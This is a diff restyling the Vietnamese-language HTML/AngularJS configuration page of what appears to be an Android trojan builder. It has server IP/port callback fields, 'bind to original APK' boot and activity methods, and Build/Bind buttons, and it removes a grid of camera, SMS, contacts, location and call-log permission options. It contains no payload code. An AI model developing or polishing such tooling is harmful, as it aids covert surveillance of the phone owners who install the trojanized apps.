@@ -1,227 +1,323 @@
-<div class="ui segment h100">
-    <div class="ui two column grid stackable">
-        <!-- CỘT TRÁI: IP / PORT -->
-        <div class="column">
-            <h4 class="ui dividing header section-title" style="
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            font-size: 16px;
-            font-weight: 600;
-            ">
-                <svg
-                    width="24"
-                    height="24"
-                    viewBox="0 0 24 24"
-                    fill="none"
-                    xmlns="http://www.w3.org/2000/svg"
-                >
-                    <circle
-                        cx="12"
-                        cy="12"
-                        r="3"
-                        stroke="black"
-                        stroke-width="1.5"
-                    />
-                    <path d="M13.7654 2.15224C13.3978 2 12.9319 2 12 2C11.0681 2 10.6022 2 10.2346 2.15224C9.74457 2.35523 9.35522 2.74458 9.15223 3.23463C9.05957 3.45834 9.0233 3.7185 9.00911 4.09799C8.98826 4.65568 8.70226 5.17189 8.21894 5.45093C7.73564 5.72996 7.14559 5.71954 6.65219 5.45876C6.31645 5.2813 6.07301 5.18262 5.83294 5.15102C5.30704 5.08178 4.77518 5.22429 4.35436 5.5472C4.03874 5.78938 3.80577 6.1929 3.33983 6.99993C2.87389 7.80697 2.64092 8.21048 2.58899 8.60491C2.51976 9.1308 2.66227 9.66266 2.98518 10.0835C3.13256 10.2756 3.3397 10.437 3.66119 10.639C4.1338 10.936 4.43789 11.4419 4.43786 12C4.43783 12.5581 4.13375 13.0639 3.66118 13.3608C3.33965 13.5629 3.13248 13.7244 2.98508 13.9165C2.66217 14.3373 2.51966 14.8691 2.5889 15.395C2.64082 15.7894 2.87379 16.193 3.33973 17C3.80568 17.807 4.03865 18.2106 4.35426 18.4527C4.77508 18.7756 5.30694 18.9181 5.83284 18.8489C6.07289 18.8173 6.31632 18.7186 6.65204 18.5412C7.14547 18.2804 7.73556 18.27 8.2189 18.549C8.70224 18.8281 8.98826 19.3443 9.00911 19.9021C9.02331 20.2815 9.05957 20.5417 9.15223 20.7654C9.35522 21.2554 9.74457 21.6448 10.2346 21.8478C10.6022 22 11.0681 22 12 22C12.9319 22 13.3978 22 13.7654 21.8478C14.2554 21.6448 14.6448 21.2554 14.8477 20.7654C14.9404 20.5417 14.9767 20.2815 14.9909 19.902C15.0117 19.3443 15.2977 18.8281 15.781 18.549C16.2643 18.2699 16.8544 18.2804 17.3479 18.5412C17.6836 18.7186 17.927 18.8172 18.167 18.8488C18.6929 18.9181 19.2248 18.7756 19.6456 18.4527C19.9612 18.2105 20.1942 17.807 20.6601 16.9999C21.1261 16.1929 21.3591 15.7894 21.411 15.395C21.4802 14.8691 21.3377 14.3372 21.0148 13.9164C20.8674 13.7243 20.6602 13.5628 20.3387 13.3608C19.8662 13.0639 19.5621 12.558 19.5621 11.9999C19.5621 11.4418 19.8662 10.9361 20.3387 10.6392C20.6603 10.4371 20.8675 10.2757 21.0149 10.0835C21.3378 9.66273 21.4803 9.13087 21.4111 8.60497C21.3592 8.21055 21.1262 7.80703 20.6602 7C20.1943 6.19297 19.9613 5.78945 19.6457 5.54727C19.2249 5.22436 18.693 5.08185 18.1671 5.15109C17.9271 5.18269 17.6837 5.28136 17.3479 5.4588C16.8545 5.71959 16.2644 5.73002 15.7811 5.45096C15.2977 5.17191 15.0117 4.65566 14.9909 4.09794C14.9767 3.71848 14.9404 3.45833 14.8477 3.23463C14.6448 2.74458 14.2554 2.35523 13.7654 2.15224Z" stroke="black" stroke-width="1.5"/>
-                </svg>
-                Cấu hình APK
-            </h4>
-            <div class="ui form">
-                <!-- IP BLOCK -->
-                <div class="field" style="background-color: #7ed4a2; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
-                    <label style="font-weight: bold;">
-                        <i class="fas fa-globe" style="margin-right: 6px; color: #21ba45;"></i>
-                        Server IP
-                    </label>
-                    <div class="ui left icon input">
-                        <input ng-model="srcIP" type="text" placeholder="188.132.xxx.xxx">
-                        <i class="fas fa-network-wired icon"></i>
-                    </div>
-                </div>
-                <!-- PORT BLOCK -->
-                <div class="field" style="background-color: #c4aa58; padding: 15px; border-radius: 8px;">
-                    <label style="font-weight: bold;">
-                        <i class="fas fa-plug" style="margin-right: 6px; color: #f2711c;"></i>
-                        Server Port
-                    </label>
-                    <div class="ui left icon input">
-                        <input
-                            ng-model="srcPort"
-                            type="number"
-                            min="1025"
-                            max="65535"
-                            placeholder="default is 9094"
-                        >
-                        <i class="fas fa-terminal icon"></i>
+<!DOCTYPE html>
+<html lang="vi" class="h-full">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Thiết lập APK</title>
+        <!-- Semantic UI & Font Awesome (CDN) -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.5.0/dist/semantic.min.css">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.2/css/all.min.css">
+        <style>
+    :root{
+      --bg: #0b0f14;
+      --card: #121824;
+      --muted: #9fb0c3;
+      --text: #e8f0ff;
+      --primary: #42b883;
+      --primary-2: #2aa876;
+      --accent: #8ab4ff;
+      --danger: #ff6b6b;
+      --warn: #ffb86b;
+      --ring: rgba(66,184,131,.35);
+      --border: rgba(255,255,255,.08);
+    }
+
+    html,body{background: var(--bg); color: var(--text);}
+    *{box-sizing: border-box}
+
+    /* Wrapper */
+    .page-wrap{
+      max-width: 1080px;
+      margin:  auto;
+      padding: 0px;
+      animation: fadeIn .3s ease-out;
+    }
+    @keyframes fadeIn{from{opacity:0; transform: translateY(6px)} to{opacity:1; transform:none}}
+
+    /* Card / Section */
+    .section-card{
+      background: linear-gradient(180deg, rgba(255,255,255,.02), transparent 60%) , var(--card);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 18px;
+      position: relative;
+      box-shadow: 0 10px 30px rgba(0,0,0,.35);
+    }
+    .section-title{
+      display:flex; align-items:center; gap:10px;
+      font-size: 16px; font-weight: 700; letter-spacing:.2px;
+      margin: 0 0 14px 0; color: var(--text);
+    }
+    .section-title .badge{
+      font-size: 11px; font-weight: 600; color: var(--accent);
+      background: rgba(138,180,255,.12); padding: 2px 8px; border-radius: 999px;
+      border: 1px solid rgba(138,180,255,.25);
+    }
+    .title-icon{
+      width: 26px; height:26px; display:grid; place-items:center;
+      border-radius: 8px; background: rgba(66,184,131,.15); color: var(--primary);
+      border: 1px solid rgba(66,184,131,.25);
+    }
+
+    /* Inputs */
+    .ui.form .field > label{
+      color: var(--muted)!important; font-weight: 700!important; letter-spacing:.2px;
+    }
+    .ui.input>input,
+    .ui.dropdown,
+    .ui.search.selection.dropdown{
+      background: #0e141f!important; color: var(--text)!important;
+      border: 1px solid var(--border)!important; border-radius: 12px!important;
+      transition: all .18s ease;
+    }
+    .ui.input>input:focus{
+      border-color: var(--accent)!important; box-shadow: 0 0 0 4px rgba(138,180,255,.15)!important;
+    }
+    .hint{font-size: 12px; color: var(--muted); margin-top:6px}
+
+    /* Permission grid */
+    .perm-grid{
+      display: grid; grid-template-columns: repeat(2, minmax(0,1fr));
+      gap: 12px;
+    }
+    @media (min-width: 900px){ .perm-grid{grid-template-columns: repeat(3, minmax(0,1fr));} }
+
+    .permission-box{
+      border: 1px solid var(--border); border-radius: 14px; padding: 14px;
+      background: #0e141f; display:flex; align-items:center; gap:12px;
+      cursor: pointer; transition: transform .12s ease, box-shadow .12s ease, border-color .12s ease;
+      /* user-select: none; */
+    }
+    .permission-box:hover{ transform: translateY(-1px); border-color: rgba(138,180,255,.35); box-shadow: 0 4px 18px rgba(0,0,0,.35);}
+    .permission-box i{ font-size: 18px; width: 22px; text-align:center; }
+    .permission-box label{ margin:0; color: var(--text); font-weight: 600; cursor: pointer}
+
+    /* Toggle (bind enable) */
+    .toggle{
+      display:flex; align-items:center; justify-content:center; gap: 10px;
+      background: #0e141f; border: 1px solid var(--border); border-radius: 999px;
+      padding: 10px 14px; width: fit-content; margin: 0 auto 10px auto;
+    }
+    .toggle .ui.checkbox label{ color: var(--text)!important; font-weight:700; }
+    .toggle .ui.checkbox input:checked~.box:before,
+    .toggle .ui.checkbox input:checked~label:before{ background: var(--primary)!important; border-color: var(--primary-2)!important; }
+
+    /* Button styles override */
+    .ui.button{
+      border-radius: 12px!important; font-weight: 700!important; letter-spacing:.2px;
+      border: 1px solid var(--border)!important;
+    }
+    .ui.button.primary{
+      background: linear-gradient(180deg, var(--primary), var(--primary-2))!important; color:#04110a!important; border: none!important;
+    }
+    .ui.button.basic{ background: #0e141f!important; color: var(--text)!important; }
+
+    /* Radio group row */
+    .radio-row{
+      display:grid; grid-template-columns: 1fr auto 1fr; gap: 12px; align-items:center;
+    }
+    .note{ font-size: 12px; color: #ff9f9f; margin-left:8px }
+
+    /* Divider line */
+    .soft-divider{ height:1px; background: var(--border); margin: 16px 0; border-radius: 999px; }
+
+    /* Colored chips for old background hints (optional) */
+    .chip{ font-size: 11px; padding: 2px 8px; border-radius: 999px; font-weight: 700;}
+    .chip.green{ color:#0b2; background: rgba(0,187,102,.12); border: 1px solid rgba(0,187,102,.35)}
+    .chip.warn{ color:#f90; background: rgba(255,153,0,.12); border: 1px solid rgba(255,153,0,.35)}
+        </style>
+    </head>
+    <body>
+        <div class="page-wrap">
+            <!-- GRID -->
+            <div class="ui stackable column grid">
+                <!-- Left -->
+                <div class="column">
+                    <div class="section-card">
+                        <div class="section-title">
+                            <span class="title-icon">
+                                <i class="fa-solid fa-gear"></i>
+                            </span>
+                            <span>Cấu hình APK</span>
+                            <span class="badge">Server</span>
+                        </div>
+                        <div class="ui form">
+                            <div class="two fields">
+                                <!-- IP -->
+                                <div class="field">
+                                    <label>
+                                        <i class="fas fa-globe" style="margin-right:6px"></i>
+                                        Server IP
+                                    </label>
+                                    <div class="ui left icon input">
+                                        <input
+                                            ng-model="srcIP"
+                                            type="text"
+                                            inputmode="numeric"
+                                            placeholder="188.132.xxx.xxx"
+                                            pattern="^((25[0-5]|2[0-4]\d|[01]?\d?\d)(\.|$)){4}"
+                                            aria-label="Địa chỉ IP máy chủ"
+                                        >
+                                        <i class="fas fa-network-wired icon" style="color: #ffffff;"></i>
+                                    </div>
+                                    <div class="hint">
+                                        Định dạng IPv4, ví dụ:
+                                        <b>188.132.150.10</b>
+                                    </div>
+                                </div>
+                                <!-- PORT -->
+                                <div class="field">
+                                    <label>
+                                        <i class="fas fa-plug" style="margin-right:6px;"></i>
+                                        Server Port
+                                    </label>
+                                    <div class="ui left icon input">
+                                        <input
+                                            ng-model="srcPort"
+                                            type="number"
+                                            min="1025"
+                                            max="65535"
+                                            placeholder="Mặc định 9094"
+                                            aria-label="Cổng máy chủ"
+                                        >
+                                        <i class="fas fa-terminal icon" style="color: #ffffff;"></i>
+                                    </div>
+                                    <div class="hint">
+                                        Khoảng hợp lệ: 1025–65535. Mặc định:
+                                        <b>9094</b>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="soft-divider"></div>
+                            <!-- Quick actions -->
+                            <div class="ui small buttons" style="display: flex; justify-content: flex-start; gap: 4px; align-items: center;">
+                                <button class="ui button basic" ng-click="srcIP='127.0.0.1'">
+                                    <i class="fa-solid fa-bolt"></i>
+                                    Localhost
+                                </button>
+                                <button class="ui button basic" ng-click="srcPort=9094">
+                                    <i class="fa-solid fa-rotate"></i>
+                                    Dùng cổng mặc định
+                                </button>
+                            </div>
+                        </div>
                     </div>
                 </div>
             </div>
-        </div>
-        <!-- CỘT PHẢI: PERMISSIONS -->
-        <div class="column">
-            <h4 class="ui dividing header section-title" style="
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            font-size: 16px;
-            font-weight: 600;
-            ">
-                <svg
-                    width="24"
-                    height="24"
-                    viewBox="0 0 24 24"
-                    fill="none"
-                    xmlns="http://www.w3.org/2000/svg"
-                >
-                    <path
-                        d="M14.5 6.5H17.5M17.5 6.5H20.5M17.5 6.5V9.5M17.5 6.5V3.5"
-                        stroke="black"
-                        stroke-width="1.5"
-                        stroke-linecap="round"
-                    />
-                    <path d="M2.5 6.5C2.5 4.61438 2.5 3.67157 3.08579 3.08579C3.67157 2.5 4.61438 2.5 6.5 2.5C8.38562 2.5 9.32843 2.5 9.91421 3.08579C10.5 3.67157 10.5 4.61438 10.5 6.5C10.5 8.38562 10.5 9.32843 9.91421 9.91421C9.32843 10.5 8.38562 10.5 6.5 10.5C4.61438 10.5 3.67157 10.5 3.08579 9.91421C2.5 9.32843 2.5 8.38562 2.5 6.5Z" stroke="black" stroke-width="1.5"/>
-                    <path d="M13.5 17.5C13.5 15.6144 13.5 14.6716 14.0858 14.0858C14.6716 13.5 15.6144 13.5 17.5 13.5C19.3856 13.5 20.3284 13.5 20.9142 14.0858C21.5 14.6716 21.5 15.6144 21.5 17.5C21.5 19.3856 21.5 20.3284 20.9142 20.9142C20.3284 21.5 19.3856 21.5 17.5 21.5C15.6144 21.5 14.6716 21.5 14.0858 20.9142C13.5 20.3284 13.5 19.3856 13.5 17.5Z" stroke="black" stroke-width="1.5"/>
-                    <path d="M2.5 17.5C2.5 15.6144 2.5 14.6716 3.08579 14.0858C3.67157 13.5 4.61438 13.5 6.5 13.5C8.38562 13.5 9.32843 13.5 9.91421 14.0858C10.5 14.6716 10.5 15.6144 10.5 17.5C10.5 19.3856 10.5 20.3284 9.91421 20.9142C9.32843 21.5 8.38562 21.5 6.5 21.5C4.61438 21.5 3.67157 21.5 3.08579 20.9142C2.5 20.3284 2.5 19.3856 2.5 17.5Z" stroke="black" stroke-width="1.5"/>
-                </svg>
-                Quyền tùy chỉnh
-            </h4>
-            <div class="ui stackable two column grid">
-                <div class="column permission-box" style="background-color: #ffe8e6;">
+            <!-- Bind APK -->
+            <div class="section-card" style="margin-top:16px">
+                <div class="section-title" style="margin-bottom:10px">
+                    <span class="title-icon" style="background: rgba(255,184,107,.16); color: var(--warn); border-color: rgba(255,184,107,.35)">
+                        <i class="fa-solid fa-link"></i>
+                    </span>
+                    <span>Liên kết APK gốc</span>
+                    <span class="badge">Bind</span>
+                </div>
+                <!-- Toggle enable -->
+                <div class="toggle">
                     <div class="ui checkbox">
                         <input
                             type="checkbox"
-                            id="Permissions1"
-                            value="CameraPer"
-                            class="settings icon"
+                            ng-model="bindApk.enable"
+                            name="bind"
+                            id="toggleBind"
                         >
-                        <label>
-                            <i class="fas fa-camera"></i>
-                            Camera
-                        </label>
+                        <label for="toggleBind">Bật liên kết với Apk gốc</label>
                     </div>
                 </div>
-                <div class="column permission-box" style="background-color: #fff6e6;">
-                    <div class="ui checkbox">
-                        <input type="checkbox" id="Permissions2" value="StoragePer">
-                        <label>
-                            <i class="fas fa-folder-open"></i>
-                            Bộ nhớ máy
-                        </label>
+                <!-- Methods + actions -->
+                <div ng-hide="!bindApk.enable">
+                    <div class="radio-row">
+                        <!-- Boot method -->
+                        <div class="ui form">
+                            <div class="inline fields" style="margin:0">
+                                <div class="field">
+                                    <div class="ui radio checkbox">
+                                        <input
+                                            type="radio"
+                                            name="method"
+                                            checked="checked"
+                                            ng-model="bindApk.method"
+                                            value="BOOT"
+                                            id="methodBoot"
+                                        >
+                                        <label for="methodBoot">
+                                            <b>Boot Method</b>
+                                            <span class="note">Cần khởi động lại thiết bị</span>
+                                        </label>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <!-- Browse APK -->
+                        <button ng-click="clearLogs(); BrowseApk()" ng-disabled="!bindApk.enable" class="ui black labeled icon button">
+                            <i class="android icon"></i>
+                            Chọn tệp APK
+                        </button>
+                        <!-- Activity method -->
+                        <div class="ui form">
+                            <div class="inline fields" style="margin:0">
+                                <div class="field">
+                                    <div class="ui radio checkbox">
+                                        <input
+                                            type="radio"
+                                            name="method"
+                                            ng-model="bindApk.method"
+                                            value="ACTIVITY"
+                                            id="methodActivity"
+                                        >
+                                        <label for="methodActivity">
+                                            <b>Activity Method</b>
+                                            <span class="note">Không chạy trên mọi app</span>
+                                        </label>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
                     </div>
+                    <div style="height:10px"></div>
                 </div>
-                <div class="column permission-box" style="background-color: #f0f8ff;">
-                    <div class="ui checkbox">
-                        <input type="checkbox" id="Permissions3" value="MicPer">
-                        <label>
-                            <i class="fas fa-microphone"></i>
-                            Micro
-                        </label>
-                    </div>
-                </div>
-                <div class="column permission-box" style="background-color: #e7f9ed;">
-                    <div class="ui checkbox">
-                        <input type="checkbox" id="Permissions4" value="LocationPer">
-                        <label>
-                            <i class="fas fa-location-dot"></i>
-                            Vị trí
-                        </label>
-                    </div>
-                </div>
-                <div class="column permission-box" style="background-color: #f5e6ff;">
-                    <div class="ui checkbox">
-                        <input type="checkbox" id="Permissions5" value="ContactsPer">
-                        <label>
-                            <i class="fas fa-address-book"></i>
-                            Danh bạ
-                        </label>
-                    </div>
-                </div>
-                <div class="column permission-box" style="background-color: #e8f4fc;">
-                    <div class="ui checkbox">
-                        <input type="checkbox" id="Permissions6" value="SMSPer">
-                        <label>
-                            <i class="fas fa-comment-dots"></i>
-                            SMS
-                        </label>
-                    </div>
-                </div>
-                <div class="column permission-box" style="background-color: #fef1e6;">
-                    <div class="ui checkbox">
-                        <input type="checkbox" id="Permissions7" value="CallsLogsPer">
-                        <label>
-                            <i class="fas fa-phone"></i>
-                            Nhật ký cuộc gọi
-                        </label>
-                    </div>
+                <div class="soft-divider"></div>
+                <!-- Footer buttons -->
+                <div style="display:flex; justify-content:center; gap:10px">
+                    <!-- Build (no bind) -->
+                    <button
+                        ng-click="clearLogs(); Build(srcIP,srcPort)"
+                        ng-hide="bindApk.enable"
+                        ng-show="Build"
+                        class="ui labeled icon red button"
+                    >
+                        <i class="hammer icon"></i>
+                        Build
+                    </button>
+                    <!-- Bind (when enabled) -->
+                    <button
+                        ng-click="clearLogs(); Build(srcIP,srcPort)"
+                        ng-hide="Build"
+                        ng-show="bindApk.enable"
+                        class="ui labeled icon primary button"
+                    >
+                        <i class="screwdriver icon"></i>
+                        Bind
+                    </button>
                 </div>
             </div>
+            <!-- Tips -->
+            <div style="margin-top:10px; color: var(--muted); font-size:12px;">
+                <span class="chip green">Mẹo</span>
+                Điền IP/Port trước khi Bind/Build để tránh lỗi cấu hình.
+                <span class="chip warn" style="margin-left:8px">Lưu ý</span>
+                Kiểm tra quyền cần thiết tùy theo chức năng app gốc.
+            </div>
         </div>
-        <!-- GIỮ NGUYÊN PHẦN BIND APK & BUILD BUTTON -->
-        <table class="ui very compact table">
-            <thead>
-                <tr class="center aligned">
-                    <th colspan="3">
-                        <div class="ui checkbox ">
-                            <input ng-model="bindApk.enable" type="checkbox" name="bind">
-                            <label>Liên kết với Apk gốc</label>
-                        </div>
-                    </th>
-                </tr>
-            </thead>
-            <tbody ng-hide="!bindApk.enable">
-                <tr class="center aligned">
-                    <td>
-                        <div class="ui radio checkbox">
-                            <input
-                                type="radio"
-                                name="method"
-                                checked="checked"
-                                ng-model="bindApk.method"
-                                value="BOOT"
-                            >
-                            <label>Boot Method</label>
-                            <span style="font-size: 14px ;color: red">Device restart required</span>
-                        </div>
-                    </td>
-                    <td>
-                        <button ng-click="clearLogs(); BrowseApk()" ng-disabled="!bindApk.enable" class="ui black labeled icon button ">
-                            <i class="android icon"></i>
-                            Browse Apk
-                        </button>
-                    </td>
-                    <td>
-                        <div class="ui radio checkbox">
-                            <input
-                                type="radio"
-                                name="method"
-                                ng-model="bindApk.method"
-                                value="ACTIVITY"
-                            >
-                            <label>Activity Method</label>
-                            <span style="font-size: 14px ;color: red">Doesn't work on all apps</span>
-                        </div>
-                    </td>
-                </tbody>
-                <tfoot class="half-width">
-                    <tr class="center aligned">
-                        <th colspan="3">
-                            <button
-                                ng-click="clearLogs(); Build(srcIP,srcPort)"
-                                ng-hide="bindApk.enable"
-                                ng-show="Build"
-                                class="ui labeled icon red button"
-                            >
-                                <i class="hammer icon"></i>
-                                Build
-                            </button>
-                            <button
-                                ng-click="clearLogs(); Build(srcIP,srcPort)"
-                                ng-hide="Build"
-                                ng-show="bindApk.enable"
-                                class="ui labeled icon green button"
-                            >
-                                <i class="screwdriver icon"></i>
-                                Bind
-                            </button>
-                        </th>
-                    </tr>
-                </tfoot>
-            </table>
-        </div>
+        <!-- Init Semantic checkboxes/radios (optional if Angular already handles) -->
+        <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/semantic-ui@2.5.0/dist/semantic.min.js"></script>
+        <script>
+    // Kích hoạt style cho checkbox/radio của Semantic (không ảnh hưởng Angular model)
+    $(function(){
+      $('.ui.checkbox').checkbox();
+    });
+        </script>
+    </body>
+</html>
